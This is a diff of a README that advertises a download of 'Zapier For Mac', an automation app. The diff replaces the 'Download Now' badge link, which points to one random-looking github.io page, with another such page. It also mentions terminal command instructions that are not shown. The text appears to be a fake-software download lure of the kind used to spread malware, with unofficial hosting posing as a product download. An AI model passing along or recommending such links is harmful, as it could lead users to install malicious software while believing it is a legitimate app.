@@ -3,7 +3,7 @@
 
 Zapier For Mac is a powerful automation tool designed to connect over 7,000 apps, streamlining workflows and boosting productivity on macOS. Automate repetitive tasks like data syncing, notifications, and task management without coding. Follow the instructions below to download and install Zapier For Mac effortlessly.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-FF6200?style=for-the-badge&logo=zapier)](https://fituganshfgh.github.io/.github/zapier)
+[![Download Now](https://img.shields.io/badge/Download-Now-FF6200?style=for-the-badge&logo=zapier)](https://mrboomzeus519.github.io/gimronus/zapier)
 
 If you encounter issues downloading via the button above, follow the terminal command instructions below.
 
